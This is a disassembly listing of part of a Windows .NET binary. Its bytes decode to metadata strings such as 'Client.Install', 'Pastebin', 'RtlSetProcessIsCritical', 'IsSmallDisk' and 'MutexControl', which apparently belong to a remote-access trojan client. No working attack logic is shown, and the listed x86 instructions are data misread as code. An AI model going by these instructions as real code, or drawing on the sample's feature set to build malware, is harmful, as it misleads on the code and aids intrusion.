  4064c5:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4064cb:	00 6f 62             	add    %ch,0x62(%edi)
  4064ce:	6a 00                	push   $0x0
  4064d0:	4d                   	dec    %ebp
  4064d1:	65 73 73             	gs jae 0x406547
  4064d4:	61                   	popa
  4064d5:	67 65 50             	addr16 gs push %eax
  4064d8:	61                   	popa
  4064d9:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4064dc:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4064e3:	61                   	popa
  4064e4:	67 65 50             	addr16 gs push %eax
  4064e7:	61                   	popa
  4064e8:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064eb:	4d                   	dec    %ebp
  4064ec:	73 67                	jae    0x406555
  4064ee:	50                   	push   %eax
  4064ef:	61                   	popa
  4064f0:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064f3:	41                   	inc    %ecx
  4064f4:	73 79                	jae    0x40656f
  4064f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4064f7:	63 43 61             	arpl   %eax,0x61(%ebx)
  4064fa:	6c                   	insb   (%dx),%es:(%edi)
  4064fb:	6c                   	insb   (%dx),%es:(%edi)
  4064fc:	62 61 63             	bound  %esp,0x63(%ecx)
  4064ff:	6b 00 52             	imul   $0x52,(%eax),%eax
  406502:	65 6d                	gs insl (%dx),%es:(%edi)
  406504:	6f                   	outsl  %ds:(%esi),(%dx)
  406505:	74 65                	je     0x40656c
  406507:	43                   	inc    %ebx
  406508:	65 72 74             	gs jb  0x40657f
  40650b:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406512:	56                   	push   %esi
  406513:	61                   	popa
  406514:	6c                   	insb   (%dx),%es:(%edi)
  406515:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40651c:	43 
  40651d:	61                   	popa
  40651e:	6c                   	insb   (%dx),%es:(%edi)
  40651f:	6c                   	insb   (%dx),%es:(%edi)
  406520:	62 61 63             	bound  %esp,0x63(%ecx)
  406523:	6b 00 54             	imul   $0x54,(%eax),%eax
  406526:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40652d:	6c                   	insb   (%dx),%es:(%edi)
  40652e:	62 61 63             	bound  %esp,0x63(%ecx)
  406531:	6b 00 75             	imul   $0x75,(%eax),%eax
  406534:	6e                   	outsb  %ds:(%esi),(%dx)
  406535:	70 61                	jo     0x406598
  406537:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40653a:	6d                   	insl   (%dx),%es:(%edi)
  40653b:	73 67                	jae    0x4065a4
  40653d:	70 61                	jo     0x4065a0
  40653f:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406542:	52                   	push   %edx
  406543:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40654a:	4b 65 
  40654c:	79 50                	jns    0x40659e
  40654e:	65 72 6d             	gs jb  0x4065be
  406551:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  406558:	68 65 63 6b 00       	push   $0x6b6365
  40655d:	46                   	inc    %esi
  40655e:	6c                   	insb   (%dx),%es:(%edi)
  40655f:	75 73                	jne    0x4065d4
  406561:	68 46 69 6e 61       	push   $0x616e6946
  406566:	6c                   	insb   (%dx),%es:(%edi)
  406567:	42                   	inc    %edx
  406568:	6c                   	insb   (%dx),%es:(%edi)
  406569:	6f                   	outsl  %ds:(%esi),(%dx)
  40656a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40656d:	49                   	dec    %ecx
  40656e:	73 53                	jae    0x4065c3
  406570:	6d                   	insl   (%dx),%es:(%edi)
  406571:	61                   	popa
  406572:	6c                   	insb   (%dx),%es:(%edi)
  406573:	6c                   	insb   (%dx),%es:(%edi)
  406574:	44                   	inc    %esp
  406575:	69 73 6b 00 52 74 6c 	imul   $0x6c745200,0x6b(%ebx),%esi
  40657c:	53                   	push   %ebx
  40657d:	65 74 50             	gs je  0x4065d0
  406580:	72 6f                	jb     0x4065f1
  406582:	63 65 73             	arpl   %esp,0x73(%ebp)
  406585:	73 49                	jae    0x4065d0
  406587:	73 43                	jae    0x4065cc
  406589:	72 69                	jb     0x4065f4
  40658b:	74 69                	je     0x4065f6
  40658d:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406590:	00 50 72             	add    %dl,0x72(%eax)
  406593:	6f                   	outsl  %ds:(%esi),(%dx)
  406594:	63 65 73             	arpl   %esp,0x73(%ebp)
  406597:	73 43                	jae    0x4065dc
  406599:	72 69                	jb     0x406604
  40659b:	74 69                	je     0x406606
  40659d:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4065a0:	00 4e 65             	add    %cl,0x65(%esi)
  4065a3:	74 77                	je     0x40661c
  4065a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4065a6:	72 6b                	jb     0x406613
  4065a8:	43                   	inc    %ebx
  4065a9:	72 65                	jb     0x406610
  4065ab:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4065ae:	74 69                	je     0x406619
  4065b0:	61                   	popa
  4065b1:	6c                   	insb   (%dx),%es:(%edi)
  4065b2:	00 53 79             	add    %dl,0x79(%ebx)
  4065b5:	73 74                	jae    0x40662b
  4065b7:	65 6d                	gs insl (%dx),%es:(%edi)
  4065b9:	2e 53                	cs push %ebx
  4065bb:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4065bf:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4065c6:	6e 
  4065c7:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4065ca:	61                   	popa
  4065cb:	6c                   	insb   (%dx),%es:(%edi)
  4065cc:	00 57 69             	add    %dl,0x69(%edi)
  4065cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4065d0:	64 6f                	outsl  %fs:(%esi),(%dx)
  4065d2:	77 73                	ja     0x406647
  4065d4:	50                   	push   %eax
  4065d5:	72 69                	jb     0x406640
  4065d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4065d8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4065db:	61                   	popa
  4065dc:	6c                   	insb   (%dx),%es:(%edi)
  4065dd:	00 41 72             	add    %al,0x72(%ecx)
  4065e0:	65 45                	gs inc %ebp
  4065e2:	71 75                	jno    0x406659
  4065e4:	61                   	popa
  4065e5:	6c                   	insb   (%dx),%es:(%edi)
  4065e6:	00 67 65             	add    %ah,0x65(%edi)
  4065e9:	74 5f                	je     0x40664a
  4065eb:	49                   	dec    %ecx
  4065ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4065ed:	74 65                	je     0x406654
  4065ef:	72 76                	jb     0x406667
  4065f1:	61                   	popa
  4065f2:	6c                   	insb   (%dx),%es:(%edi)
  4065f3:	00 73 65             	add    %dh,0x65(%ebx)
  4065f6:	74 5f                	je     0x406657
  4065f8:	49                   	dec    %ecx
  4065f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065fa:	74 65                	je     0x406661
  4065fc:	72 76                	jb     0x406674
  4065fe:	61                   	popa
  4065ff:	6c                   	insb   (%dx),%es:(%edi)
  406600:	00 43 6c             	add    %al,0x6c(%ebx)
  406603:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40660a:	73 74                	jae    0x406680
  40660c:	61                   	popa
  40660d:	6c                   	insb   (%dx),%es:(%edi)
  40660e:	6c                   	insb   (%dx),%es:(%edi)
  40660f:	00 6b 65             	add    %ch,0x65(%ebx)
  406612:	72 6e                	jb     0x406682
  406614:	65 6c                	gs insb (%dx),%es:(%edi)
  406616:	33 32                	xor    (%edx),%esi
  406618:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40661b:	6c                   	insb   (%dx),%es:(%edi)
  40661c:	00 75 73             	add    %dh,0x73(%ebp)
  40661f:	65 72 33             	gs jb  0x406655
  406622:	32 2e                	xor    (%esi),%ch
  406624:	64 6c                	fs insb (%dx),%es:(%edi)
  406626:	6c                   	insb   (%dx),%es:(%edi)
  406627:	00 6e 74             	add    %ch,0x74(%esi)
  40662a:	64 6c                	fs insb (%dx),%es:(%edi)
  40662c:	6c                   	insb   (%dx),%es:(%edi)
  40662d:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406630:	6c                   	insb   (%dx),%es:(%edi)
  406631:	00 4b 69             	add    %cl,0x69(%ebx)
  406634:	6c                   	insb   (%dx),%es:(%edi)
  406635:	6c                   	insb   (%dx),%es:(%edi)
  406636:	00 50 6f             	add    %dl,0x6f(%eax)
  406639:	6c                   	insb   (%dx),%es:(%edi)
  40663a:	6c                   	insb   (%dx),%es:(%edi)
  40663b:	00 4d 75             	add    %cl,0x75(%ebp)
  40663e:	74 65                	je     0x4066a5
  406640:	78 43                	js     0x406685
  406642:	6f                   	outsl  %ds:(%esi),(%dx)
  406643:	6e                   	outsb  %ds:(%esi),(%dx)
  406644:	74 72                	je     0x4066b8
  406646:	6f                   	outsl  %ds:(%esi),(%dx)
  406647:	6c                   	insb   (%dx),%es:(%edi)
  406648:	00 46 69             	add    %al,0x69(%esi)
  40664b:	6c                   	insb   (%dx),%es:(%edi)
  40664c:	65 53                	gs push %ebx
  40664e:	74 72                	je     0x4066c2
  406650:	65 61                	gs popa
  406652:	6d                   	insl   (%dx),%es:(%edi)
  406653:	00 4e 65             	add    %cl,0x65(%esi)
  406656:	74 77                	je     0x4066cf
  406658:	6f                   	outsl  %ds:(%esi),(%dx)
  406659:	72 6b                	jb     0x4066c6
  40665b:	53                   	push   %ebx
  40665c:	74 72                	je     0x4066d0
  40665e:	65 61                	gs popa
  406660:	6d                   	insl   (%dx),%es:(%edi)
  406661:	00 53 73             	add    %dl,0x73(%ebx)
  406664:	6c                   	insb   (%dx),%es:(%edi)
  406665:	53                   	push   %ebx
  406666:	74 72                	je     0x4066da
  406668:	65 61                	gs popa
  40666a:	6d                   	insl   (%dx),%es:(%edi)
  40666b:	00 43 72             	add    %al,0x72(%ebx)
  40666e:	79 70                	jns    0x4066e0
  406670:	74 6f                	je     0x4066e1
  406672:	53                   	push   %ebx
  406673:	74 72                	je     0x4066e7
  406675:	65 61                	gs popa
  406677:	6d                   	insl   (%dx),%es:(%edi)
  406678:	00 4d 65             	add    %cl,0x65(%ebp)
  40667b:	6d                   	insl   (%dx),%es:(%edi)
  40667c:	6f                   	outsl  %ds:(%esi),(%dx)
  40667d:	72 79                	jb     0x4066f8
  40667f:	53                   	push   %ebx
  406680:	74 72                	je     0x4066f4
  406682:	65 61                	gs popa
  406684:	6d                   	insl   (%dx),%es:(%edi)
  406685:	00 50 72             	add    %dl,0x72(%eax)
  406688:	6f                   	outsl  %ds:(%esi),(%dx)
  406689:	67 72 61             	addr16 jb 0x4066ed
  40668c:	6d                   	insl   (%dx),%es:(%edi)
  40668d:	00 67 65             	add    %ah,0x65(%edi)
  406690:	74 5f                	je     0x4066f1
  406692:	49                   	dec    %ecx
  406693:	74 65                	je     0x4066fa
  406695:	6d                   	insl   (%dx),%es:(%edi)
  406696:	00 67 65             	add    %ah,0x65(%edi)
  406699:	74 5f                	je     0x4066fa
  40669b:	49                   	dec    %ecx
  40669c:	73 36                	jae    0x4066d4
  40669e:	34 42                	xor    $0x42,%al
  4066a0:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  4066a7:	74 
  4066a8:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  4066af:	65 6d                	gs insl (%dx),%es:(%edi)
  4066b1:	00 43 6c             	add    %al,0x6c(%ebx)
  4066b4:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  4066bb:	67 6f                	outsl  %ds:(%si),(%dx)
  4066bd:	72 69                	jb     0x406728
  4066bf:	74 68                	je     0x406729
  4066c1:	6d                   	insl   (%dx),%es:(%edi)
  4066c2:	00 53 79             	add    %dl,0x79(%ebx)
  4066c5:	6d                   	insl   (%dx),%es:(%edi)
  4066c6:	6d                   	insl   (%dx),%es:(%edi)
  4066c7:	65 74 72             	gs je  0x40673c
  4066ca:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4066d1:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  4066d8:	79 
  4066d9:	6d                   	insl   (%dx),%es:(%edi)
  4066da:	6d                   	insl   (%dx),%es:(%edi)
  4066db:	65 74 72             	gs je  0x406750
  4066de:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4066e5:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4066ec:	73 
  4066ed:	68 41 6c 67 6f       	push   $0x6f676c41
  4066f2:	72 69                	jb     0x40675d
  4066f4:	74 68                	je     0x40675e
  4066f6:	6d                   	insl   (%dx),%es:(%edi)
  4066f7:	00 52 61             	add    %dl,0x61(%edx)
  4066fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4066fb:	64 6f                	outsl  %fs:(%esi),(%dx)
  4066fd:	6d                   	insl   (%dx),%es:(%edi)
  4066fe:	00 49 43             	add    %cl,0x43(%ecx)
  406701:	72 79                	jb     0x40677c
  406703:	70 74                	jo     0x406779
  406705:	6f                   	outsl  %ds:(%esi),(%dx)
  406706:	54                   	push   %esp
  406707:	72 61                	jb     0x40676a
  406709:	6e                   	outsb  %ds:(%esi),(%dx)
  40670a:	73 66                	jae    0x406772
  40670c:	6f                   	outsl  %ds:(%esi),(%dx)
  40670d:	72 6d                	jb     0x40677c
  40670f:	00 45 6e             	add    %al,0x6e(%ebp)
  406712:	75 6d                	jne    0x406781
  406714:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  406718:	6f                   	outsl  %ds:(%esi),(%dx)
  406719:	6f                   	outsl  %ds:(%esi),(%dx)
  40671a:	6c                   	insb   (%dx),%es:(%edi)
  40671b:	65 61                	gs popa
  40671d:	6e                   	outsb  %ds:(%esi),(%dx)
  40671e:	00 48 77             	add    %cl,0x77(%eax)
  406721:	69 64 47 65 6e 00 4d 	imul   $0x614d006e,0x65(%edi,%eax,2),%esp
  406728:	61 
  406729:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  406730:	43                   	inc    %ebx
  406731:	68 61 69 6e 00       	push   $0x6e6961
  406736:	63 68 61             	arpl   %ebp,0x61(%eax)
  406739:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  406740:	6f                   	outsl  %ds:(%esi),(%dx)
  406741:	6d                   	insl   (%dx),%es:(%edi)
  406742:	61                   	popa
  406743:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40674a:	43                   	inc    %ebx
  40674b:	75 72                	jne    0x4067bf
  40674d:	72 65                	jb     0x4067b4
  40674f:	6e                   	outsb  %ds:(%esi),(%dx)
  406750:	74 44                	je     0x406796
  406752:	6f                   	outsl  %ds:(%esi),(%dx)
  406753:	6d                   	insl   (%dx),%es:(%edi)
  406754:	61                   	popa
  406755:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  40675c:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  406760:	00 49 73             	add    %cl,0x73(%ecx)
  406763:	41                   	inc    %ecx
  406764:	64 6d                	fs insl (%dx),%es:(%edi)
  406766:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40676d:	00 47 65             	add    %al,0x65(%edi)
  406770:	74 46                	je     0x4067b8
  406772:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  406779:	57 
  40677a:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  406781:	78 
  406782:	74 65                	je     0x4067e9
  406784:	6e                   	outsb  %ds:(%esi),(%dx)
  406785:	73 69                	jae    0x4067f0
  406787:	6f                   	outsl  %ds:(%esi),(%dx)
  406788:	6e                   	outsb  %ds:(%esi),(%dx)
  406789:	00 67 65             	add    %ah,0x65(%edi)
  40678c:	74 5f                	je     0x4067ed
  40678e:	4f                   	dec    %edi
  40678f:	53                   	push   %ebx
  406790:	56                   	push   %esi
  406791:	65 72 73             	gs jb  0x406807
  406794:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40679b:	6c                   	insb   (%dx),%es:(%edi)
  40679c:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4067a3:	00 53 79             	add    %dl,0x79(%ebx)
  4067a6:	73 74                	jae    0x40681c
  4067a8:	65 6d                	gs insl (%dx),%es:(%edi)
  4067aa:	2e 53                	cs push %ebx
  4067ac:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4067b0:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4067b7:	68 
  4067b8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067ba:	74 69                	je     0x406825
  4067bc:	63 61 74             	arpl   %esp,0x74(%ecx)
  4067bf:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4067c6:	74 65                	je     0x40682d
  4067c8:	6d                   	insl   (%dx),%es:(%edi)
  4067c9:	2e 52                	cs push %edx
  4067cb:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4067ce:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4067d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4067d4:	00 58 35             	add    %bl,0x35(%eax)
  4067d7:	30 39                	xor    %bh,(%ecx)
  4067d9:	43                   	inc    %ebx
  4067da:	65 72 74             	gs jb  0x406851
  4067dd:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4067e4:	43                   	inc    %ebx
  4067e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4067e6:	6c                   	insb   (%dx),%es:(%edi)
  4067e7:	6c                   	insb   (%dx),%es:(%edi)
  4067e8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4067ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ee:	00 4d 61             	add    %cl,0x61(%ebp)
  4067f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f2:	61                   	popa
  4067f3:	67 65 6d             	gs insl (%dx),%es:(%di)
  4067f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067f8:	74 4f                	je     0x406849
  4067fa:	62 6a 65             	bound  %ebp,0x65(%edx)
  4067fd:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  406801:	6c                   	insb   (%dx),%es:(%edi)
  406802:	6c                   	insb   (%dx),%es:(%edi)
  406803:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406808:	6e                   	outsb  %ds:(%esi),(%dx)
  406809:	00 43 6c             	add    %al,0x6c(%ebx)
  40680c:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  406813:	6e                   	outsb  %ds:(%esi),(%dx)
  406814:	6e                   	outsb  %ds:(%esi),(%dx)
  406815:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40681a:	6e                   	outsb  %ds:(%esi),(%dx)
  40681b:	00 73 65             	add    %dh,0x65(%ebx)
  40681e:	74 5f                	je     0x40687f
  406820:	50                   	push   %eax
  406821:	6f                   	outsl  %ds:(%esi),(%dx)
  406822:	73 69                	jae    0x40688d
  406824:	74 69                	je     0x40688f
  406826:	6f                   	outsl  %ds:(%esi),(%dx)
  406827:	6e                   	outsb  %ds:(%esi),(%dx)
  406828:	00 43 72             	add    %al,0x72(%ebx)
  40682b:	79 70                	jns    0x40689d
  40682d:	74 6f                	je     0x40689e
  40682f:	67 72 61             	addr16 jb 0x406893
  406832:	70 68                	jo     0x40689c
  406834:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  40683b:	74 69                	je     0x4068a6
  40683d:	6f                   	outsl  %ds:(%esi),(%dx)
  40683e:	6e                   	outsb  %ds:(%esi),(%dx)
  40683f:	00 41 72             	add    %al,0x72(%ecx)
  406842:	67 75 6d             	addr16 jne 0x4068b2
  406845:	65 6e                	outsb  %gs:(%esi),(%dx)
  406847:	74 4e                	je     0x406897
  406849:	75 6c                	jne    0x4068b7
  40684b:	6c                   	insb   (%dx),%es:(%edi)
  40684c:	45                   	inc    %ebp
  40684d:	78 63                	js     0x4068b2
  40684f:	65 70 74             	gs jo  0x4068c6
  406852:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  406859:	75 6d                	jne    0x4068c8
  40685b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40685d:	74 45                	je     0x4068a4
  40685f:	78 63                	js     0x4068c4
  406861:	65 70 74             	gs jo  0x4068d8
  406864:	69 6f 6e 00 49 6d 61 	imul   $0x616d4900,0x6e(%edi),%ebp
  40686b:	67 65 43             	addr16 gs inc %ebx
  40686e:	6f                   	outsl  %ds:(%esi),(%dx)
  40686f:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  406874:	66 6f                	outsw  %ds:(%esi),(%dx)
  406876:	00 53 65             	add    %dl,0x65(%ebx)
  406879:	6e                   	outsb  %ds:(%esi),(%dx)
  40687a:	64 49                	fs dec %ecx
  40687c:	6e                   	outsb  %ds:(%esi),(%dx)
  40687d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40687f:	00 46 69             	add    %al,0x69(%esi)
  406882:	6c                   	insb   (%dx),%es:(%edi)
  406883:	65 49                	gs dec %ecx
  406885:	6e                   	outsb  %ds:(%esi),(%dx)
  406886:	66 6f                	outsw  %ds:(%esi),(%dx)
  406888:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40688c:	76 65                	jbe    0x4068f3
  40688e:	49                   	dec    %ecx
  40688f:	6e                   	outsb  %ds:(%esi),(%dx)
  406890:	66 6f                	outsw  %ds:(%esi),(%dx)
  406892:	00 46 69             	add    %al,0x69(%esi)
  406895:	6c                   	insb   (%dx),%es:(%edi)
  406896:	65 53                	gs push %ebx
  406898:	79 73                	jns    0x40690d
  40689a:	74 65                	je     0x406901
  40689c:	6d                   	insl   (%dx),%es:(%edi)
  40689d:	49                   	dec    %ecx
  40689e:	6e                   	outsb  %ds:(%esi),(%dx)
  40689f:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068a1:	00 43 6f             	add    %al,0x6f(%ebx)
  4068a4:	6d                   	insl   (%dx),%es:(%edi)
  4068a5:	70 75                	jo     0x40691c
  4068a7:	74 65                	je     0x40690e
  4068a9:	72 49                	jb     0x4068f4
  4068ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4068ac:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068ae:	00 43 53             	add    %al,0x53(%ebx)
  4068b1:	68 61 72 70 41       	push   $0x41707261
  4068b6:	72 67                	jb     0x40691f
  4068b8:	75 6d                	jne    0x406927
  4068ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068bc:	74 49                	je     0x406907
  4068be:	6e                   	outsb  %ds:(%esi),(%dx)
  4068bf:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068c1:	00 50 72             	add    %dl,0x72(%eax)
  4068c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4068c8:	73 53                	jae    0x40691d
  4068ca:	74 61                	je     0x40692d
  4068cc:	72 74                	jb     0x406942
  4068ce:	49                   	dec    %ecx
  4068cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4068d0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068d2:	00 50 72             	add    %dl,0x72(%eax)
  4068d5:	65 76 65             	gs jbe 0x40693d
  4068d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4068d9:	74 53                	je     0x40692e
  4068db:	6c                   	insb   (%dx),%es:(%edi)
  4068dc:	65 65 70 00          	gs gs jo 0x4068e0
  4068e0:	5a                   	pop    %edx
  4068e1:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  4068e8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068ea:	74 41                	je     0x40692d
  4068ec:	70 70                	jo     0x40695e
  4068ee:	00 4d 69             	add    %cl,0x69(%ebp)
  4068f1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4068f4:	73 6f                	jae    0x406965
  4068f6:	66 74 2e             	data16 je 0x406927
  4068f9:	43                   	inc    %ebx
  4068fa:	53                   	push   %ebx
  4068fb:	68 61 72 70 00       	push   $0x707261
  406900:	47                   	inc    %edi
  406901:	72 6f                	jb     0x406972
  406903:	75 70                	jne    0x406975
  406905:	00 4e 6f             	add    %cl,0x6f(%esi)
  406908:	72 6d                	jb     0x406977
  40690a:	61                   	popa
  40690b:	6c                   	insb   (%dx),%es:(%edi)
  40690c:	53                   	push   %ebx
  40690d:	74 61                	je     0x406970
  40690f:	72 74                	jb     0x406985
  406911:	75 70                	jne    0x406983
  406913:	00 53 79             	add    %dl,0x79(%ebx)
  406916:	73 74                	jae    0x40698c
  406918:	65 6d                	gs insl (%dx),%es:(%edi)
  40691a:	2e 4c                	cs dec %esp
  40691c:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  406923:	72 00                	jb     0x406925
  406925:	49                   	dec    %ecx
  406926:	6e                   	outsb  %ds:(%esi),(%dx)
  406927:	76 6f                	jbe    0x406998
  406929:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40692d:	6d                   	insl   (%dx),%es:(%edi)
  40692e:	62 65 72             	bound  %esp,0x72(%ebp)
  406931:	00 4d 44             	add    %cl,0x44(%ebp)
  406934:	35 43 72 79 70       	xor    $0x70797243,%eax
  406939:	74 6f                	je     0x4069aa
  40693b:	53                   	push   %ebx
  40693c:	65 72 76             	gs jb  0x4069b5
  40693f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  406946:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40694d:	41 
  40694e:	43                   	inc    %ebx
  40694f:	72 79                	jb     0x4069ca
  406951:	70 74                	jo     0x4069c7
  406953:	6f                   	outsl  %ds:(%esi),(%dx)
  406954:	53                   	push   %ebx
  406955:	65 72 76             	gs jb  0x4069ce
  406958:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40695f:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  406966:	73 
  406967:	43                   	inc    %ebx
  406968:	72 79                	jb     0x4069e3
  40696a:	70 74                	jo     0x4069e0
  40696c:	6f                   	outsl  %ds:(%esi),(%dx)
  40696d:	53                   	push   %ebx
  40696e:	65 72 76             	gs jb  0x4069e7
  406971:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  406978:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  40697f:	72 
  406980:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  406987:	64 65 72 00          	fs gs jb 0x40698b
  40698b:	49                   	dec    %ecx
  40698c:	6e                   	outsb  %ds:(%esi),(%dx)
  40698d:	73 74                	jae    0x406a03
  40698f:	61                   	popa
  406990:	6c                   	insb   (%dx),%es:(%edi)
  406991:	6c                   	insb   (%dx),%es:(%edi)
  406992:	46                   	inc    %esi
  406993:	6f                   	outsl  %ds:(%esi),(%dx)
  406994:	6c                   	insb   (%dx),%es:(%edi)
  406995:	64 65 72 00          	fs gs jb 0x406999
  406999:	49                   	dec    %ecx
  40699a:	64 53                	fs push %ebx
  40699c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40699e:	64 65 72 00          	fs gs jb 0x4069a2
  4069a2:	73 65                	jae    0x406a09
  4069a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4069a5:	64 65 72 00          	fs gs jb 0x4069a9
  4069a9:	4d                   	dec    %ebp
  4069aa:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4069b1:	74 2e                	je     0x4069e1
  4069b3:	43                   	inc    %ebx
  4069b4:	53                   	push   %ebx
  4069b5:	68 61 72 70 2e       	push   $0x2e707261
  4069ba:	52                   	push   %edx
  4069bb:	75 6e                	jne    0x406a2b
  4069bd:	74 69                	je     0x406a28
  4069bf:	6d                   	insl   (%dx),%es:(%edi)
  4069c0:	65 42                	gs inc %edx
  4069c2:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4069c9:	61                   	popa
  4069ca:	6c                   	insb   (%dx),%es:(%edi)
  4069cb:	6c                   	insb   (%dx),%es:(%edi)
  4069cc:	53                   	push   %ebx
  4069cd:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4069d4:	65 
  4069d5:	72 00                	jb     0x4069d7
  4069d7:	47                   	inc    %edi
  4069d8:	65 74 45             	gs je  0x406a20
  4069db:	6e                   	outsb  %ds:(%esi),(%dx)
  4069dc:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4069df:	65 72 00             	gs jb  0x4069e2
  4069e2:	67 65 74 5f          	addr16 gs je 0x406a45
  4069e6:	42                   	inc    %edx
  4069e7:	75 66                	jne    0x406a4f
  4069e9:	66 65 72 00          	data16 gs jb 0x4069ed
